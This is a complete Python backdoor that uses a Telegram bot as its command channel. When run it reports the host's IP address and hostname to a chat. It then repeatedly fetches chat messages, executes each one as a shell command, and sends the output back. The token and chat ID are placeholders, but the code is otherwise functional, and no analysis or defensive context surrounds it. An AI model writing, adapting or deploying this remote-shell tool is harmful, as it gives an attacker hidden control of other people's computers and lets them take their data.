import socket
from time import sleep
import subprocess
import requests

telegram_token = 'your telegram token'
chat_id='your chat id'

def cmd(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return p.stdout.read().decode(errors='replace').strip()

def send_messages(message):
    return requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)

def read_messages(offset):
    r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='+offset)
    con = r.json()['result'][-1]
    offset = con['update_id']
    message = con['message']['text']
    return offset, message


def getFirstoffset(telegram_token):
    r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset=678189729')
    t = str(r.json()).split("{'update_id':")[-1]
    t = t.split()
    t = t[0].replace(',','')
    return t


def start():
    send_messages('New connection,'+socket.gethostbyname(socket.gethostname())+' '+socket.gethostname())
    ffo=1
    off=getFirstoffset(telegram_token)
    count=0
    while True:
        try:
            off,m=read_messages(str(off))
            if off!=ffo:
                ffo=off
                if count>=1:
                    send_messages(cmd(m))
            sleep(0.5)
        except:
            pass
        count=1
        
        
if __name__=='__main__':
    start()
    
    
